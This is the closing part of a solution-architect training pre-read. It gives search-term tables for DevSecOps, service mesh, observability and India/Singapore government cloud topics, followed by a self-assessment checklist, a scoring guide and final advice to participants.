| Checkov           | `"Checkov IaC security scanning Terraform tutorial"`   | IaC security       |
| GitOps ArgoCD     | `"ArgoCD GitOps Kubernetes getting started tutorial"`  | Deployment pattern |

## DevSecOps & Security

| Topic                  | Search Term                                             | Why                   |
| ---------------------- | ------------------------------------------------------- | --------------------- |
| OWASP Dependency Check | `"OWASP Dependency Check Maven plugin CI integration"`  | SCA tooling           |
| SonarQube              | `"SonarQube Spring Boot integration quality gates"`     | SAST tooling          |
| OWASP ZAP              | `"OWASP ZAP automated scan CI CD integration tutorial"` | DAST tooling          |
| GitLeaks               | `"GitLeaks secret scanning pre-commit hooks setup"`     | Secret detection      |
| Log4Shell              | `"Log4Shell CVE-2021-44228 Java mitigation"`            | Real incident study   |
| CERT-In reporting      | `"CERT-In incident reporting India cyber security"`     | Regulatory obligation |

## Service Mesh & Advanced Observability

| Topic                    | Search Term                                           | Why                  |
| ------------------------ | ----------------------------------------------------- | -------------------- |
| Istio getting started    | `"Istio service mesh getting started tutorial"`       | Day 13 service mesh  |
| Istio traffic management | `"Istio VirtualService canary deployment tutorial"`   | Traffic control      |
| Istio mTLS               | `"Istio mutual TLS configuration PeerAuthentication"` | Security layer       |
| ELK Stack                | `"ELK stack tutorial Docker Compose setup"`           | Day 13 observability |
| Logstash PII masking     | `"Logstash filter gsub PII masking pattern"`          | Compliance logging   |
| Kibana dashboards        | `"Kibana dashboard tutorial creating visualisations"` | Log analysis         |

## Alerting & Incident Response

| Topic                | Search Term                                          | Why               |
| -------------------- | ---------------------------------------------------- | ----------------- |
| Prometheus alerting  | `"Prometheus alerting rules configuration tutorial"` | Alert setup       |
| SLO burn rate        | `"SLO burn rate alerting Google SRE workbook"`       | Advanced alerting |
| AlertManager         | `"Prometheus Alertmanager configuration PagerDuty"`  | Alert routing     |
| Runbook template     | `"SRE runbook template operations guide"`            | Operational docs  |
| Post-mortem template | `"blameless post-mortem template SRE"`               | Incident analysis |

## India/Singapore Government Context

| Topic                  | Search Term                                              | Why                     |
| ---------------------- | -------------------------------------------------------- | ----------------------- |
| NIC cloud              | `"NIC MeghRaj cloud government India Kubernetes"`        | On-prem K8s context     |
| GCC Singapore          | `"Government Commercial Cloud GCC Singapore GovTech"`    | Singapore cloud context |
| India CERT-In advisory | `"CERT-In cybersecurity advisory government India 2024"` | Security compliance     |
| Singapore CSA          | `"Cyber Security Agency Singapore incident reporting"`   | Security compliance     |
| IM8 Singapore          | `"Instruction Manual 8 IM8 Singapore IT security"`       | Security policy         |
| MeitY cloud policy     | `"MeitY cloud computing policy India government"`        | Cloud governance        |

---

# Complete Self-Assessment Checklist

> **Instructions:** Complete this checklist before attending Day 1 (Jun 11). Be honest. This is for your own preparation benefit — not graded.

## Part 1 — Architectural Foundations

```
┌─────────────────────────────────────────────────────────────────────────┐
│  ARCHITECTURAL MINDSET                                           LEVEL  │
│  ───────────────────                                            ─────  │
│                                                                         │
│  □ I can name 5 NFR categories and give a measurable example    [ / ]  │
│    for each (1=aware, 2=understand, 3=can apply)                       │
│                                                                         │
│  □ I can explain the CAP theorem and give one government        [ / ]  │
│    system example where each choice was made                           │
│                                                                         │
│  □ I have written at least one ADR before (or can write one     [ / ]  │
│    from the template in this document)                                 │
│                                                                         │
│  □ I can explain what TCO means and what factors constitute it  [ / ]  │
│    beyond just infrastructure cost                                     │
│                                                                         │
│  DDD & API DESIGN                                                       │
│  ────────────────                                                       │
│  □ I can identify at least 2 bounded contexts in a government   [ / ]  │
│    system of my choice                                                 │
│                                                                         │
│  □ I understand the difference between an Entity, Value Object  [ / ]  │
│    and Aggregate Root in DDD                                           │
│                                                                         │
│  □ I can read and write a basic OpenAPI 3.0 specification       [ / ]  │
│                                                                         │
│  □ I understand Hexagonal Architecture and can explain why      [ / ]  │
│    it helps during database technology migrations                      │
│                                                                         │
│  DISTRIBUTED SYSTEMS                                                    │
│  ────────────────────                                                   │
│  □ I can explain the difference between microservices and SOA   [ / ]  │
│    including when each is appropriate                                  │
│                                                                         │
│  □ I understand Kafka's core concepts: topics, partitions,      [ / ]  │
│    consumer groups, offsets, and log retention                         │
│                                                                         │
│  □ I can explain Event Sourcing and why it matters for          [ / ]  │
│    government audit requirements                                       │
│                                                                         │
│  □ I understand CQRS and can draw a diagram showing the         [ / ]  │
│    separation of command and query models                              │
│                                                                         │
│  SECURITY                                                               │
│  ────────                                                               │
│  □ I can explain Zero Trust Architecture in 5 sentences         [ / ]  │
│    and name the 5 layers                                               │
│                                                                         │
│  □ I understand OAuth 2.0 + OIDC flow and can explain           [ / ]  │
│    what a JWT contains and how it is validated                         │
│                                                                         │
│  □ I understand what mTLS is and how it differs from TLS        [ / ]  │
└─────────────────────────────────────────────────────────────────────────┘
```

## Part 2 — Microservices, AI & Modernization

```
┌─────────────────────────────────────────────────────────────────────────┐
│  ADVANCED MICROSERVICES                                          LEVEL  │
│  ─────────────────────                                          ─────  │
│                                                                         │
│  □ I can draw and explain a choreography-based SAGA             [ / ]  │
│    with compensating transactions for a 4-step process                 │
│                                                                         │
│  □ I can explain idempotency and describe an implementation     [ / ]  │
│    using Redis and an idempotency key                                  │
│                                                                         │
│  □ I understand the Bulkhead, Circuit Breaker, and Rate         [ / ]  │
│    Limiting patterns and can name a library implementing each          │
│                                                                         │
│  □ I understand what BFF (Backend For Frontend) pattern is      [ / ]  │
│    and why it is used for mobile-first government apps                 │
│                                                                         │
│  LEGACY MIGRATION                                                       │
│  ────────────────                                                       │
│  □ I can explain the Strangler Fig pattern with a               [ / ]  │
│    real government migration scenario                                  │
│                                                                         │
│  □ I understand what CDC (Change Data Capture) is and           [ / ]  │
│    name one open-source tool that implements it                        │
│                                                                         │
│  □ I understand the Expand-Contract database migration          [ / ]  │
│    technique and why it avoids downtime                                │
│                                                                         │
│  AI & PERFORMANCE                                                       │
│  ─────────────────                                                      │
│  □ I can write a structured prompt for architecture work        [ / ]  │
│    that includes context, constraints, and expected output             │
│                                                                         │
│  □ I can name 5 categories of security issues in AI-            [ / ]  │
│    generated code and the tools used to detect them                   │
│                                                                         │
│  □ I understand the difference between load, stress,            [ / ]  │
│    soak, and spike tests and when to use each                         │
│                                                                         │
│  □ I understand the three pillars of observability and          [ / ]  │
│    can name one tool for each pillar                                   │
│                                                                         │
│  □ I understand what an SLO, SLI, and error budget are          [ / ]  │
│    and can calculate a monthly error budget from an SLO               │
└─────────────────────────────────────────────────────────────────────────┘
```

## Part 3 — DevSecOps, Deployment & Excellence

```
┌─────────────────────────────────────────────────────────────────────────┐
│  CONTAINERIZATION & KUBERNETES                                   LEVEL  │
│  ─────────────────────────────                                  ─────  │
│                                                                         │
│  □ I can write a production-grade multi-stage Dockerfile        [ / ]  │
│    including non-root user and health check                            │
│                                                                         │
│  □ I understand Kubernetes Deployment, Service, Ingress,        [ / ]  │
│    HPA, and can explain when to use StatefulSet                        │
│                                                                         │
│  □ I understand the difference between liveness and             [ / ]  │
│    readiness probes and why both are needed                            │
│                                                                         │
│  □ I can explain resource requests vs limits and what           [ / ]  │
│    happens when a container exceeds its memory limit                   │
│                                                                         │
│  IaC & DEVSECOPS                                                        │
│  ────────────────                                                       │
│  □ I understand Terraform's core concepts: provider,            [ / ]  │
│    resource, state, plan, apply, and module                            │
│                                                                         │
│  □ I understand why remote state is mandatory for team          [ / ]  │
│    Terraform usage and what state locking prevents                     │
│                                                                         │
│  □ I can explain the difference between SAST, DAST, and        [ / ]  │
│    SCA and name one tool for each                                      │
│                                                                         │
│  □ I understand what GitOps is and how ArgoCD or Flux           [ / ]  │
│    implements it                                                        │
│                                                                         │
│  SERVICE MESH & OBSERVABILITY                                           │
│  ────────────────────────────                                           │
│  □ I understand what a service mesh provides and why            [ / ]  │
│    it is preferable to implementing mTLS in application code           │
│                                                                         │
│  □ I understand the ELK stack components and the role           [ / ]  │
│    of each: Elasticsearch, Logstash, Kibana, Beats                    │
│                                                                         │
│  □ I understand why PII must be masked in logs and can          [ / ]  │
│    describe a Logstash filter approach to achieve this                 │
│                                                                         │
│  □ I understand burn-rate alerting and can explain why          [ / ]  │
│    it is better than fixed-threshold alerting                          │
│                                                                         │
│  □ I can write a basic runbook structure for a common           [ / ]  │
│    production incident scenario                                        │
└─────────────────────────────────────────────────────────────────────────┘
```

## Scoring Guide

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SELF-ASSESSMENT SCORING                              │
│                                                                         │
│  Count your 3-ratings (can apply):                                     │
│                                                                         │
│  24–30 items rated 3:  You are well-prepared. Day 1 will be a       │
│                         review of foundational concepts for you.      │
│                         Use your preparation time on the capstone    │
│                         scenario design.                               │
│                                                                         │
│  16–23 items rated 3:  You are adequately prepared. Focus your       │
│                         remaining study time on items rated 1 or 2.  │
│                         You will be challenged but will keep up.     │
│                                                                         │
│  8–15 items rated 3:   Prioritise the pre-program LMS assessment.    │
│                         Re-read Part 1 carefully. Attend the first   │
│                         two days with extra focus. Ask questions.    │
│                                                                         │
│  < 8 items rated 3:    Consider whether your background is suited    │
│                         for this cohort. Discuss with the program    │
│                         coordinator. The 63-hour program assumes a   │
│                         solid engineering foundation. Gaps at this   │
│                         stage will compound through the course.      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

# Final Note to All Participants

This pre-read covers the conceptual surface of topics that will be explored at significant depth during the 14-day program. The real learning happens in the classroom through case studies, hands-on labs, and the capstone project.

The goal of this document is not to make you an expert before you arrive. It is to ensure that when your facilitator says "bounded context," "burn rate," or "Strangler Fig," you have a mental model to hang the new knowledge on.

**The three things that matter most before Day 1:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  1. Complete the LMS pre-program assessment honestly.                  │
│     It calibrates the program to your cohort's actual baseline.       │
│                                                                         │
│  2. Identify a real-world system you know well.                       │
│     During the course, you will apply patterns to real contexts.     │
│     Having your own reference system makes this far more powerful.   │
│     This could be a system you built, maintained, or currently work  │
│     on. Government system preferred given the program domain focus.  │
│                                                                         │
│  3. Come with questions, not just answers.                             │
│     The shift from engineer to architect is a shift from             │
│     "I know how to build this" to "I know what questions to ask     │
│     before we decide whether to build this and how."                 │
│     The quality of your questions on Day 1 is a better indicator    │
│     of your architectural readiness than any assessment score.       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

*Document Version: 1.0 | Pre-Read Part 3 of 3 — COMPLETE*

*Senior Engineer → Solution Architect Accelerated Program | June 2026*

*Total Pre-Read: 3 Parts | Estimated Reading Time: 6–8 hours*

*This document is proprietary training material. Do not distribute outside the enrolled cohort.*

*For queries regarding this pre-read, contact the program coordinator via LMS messaging.*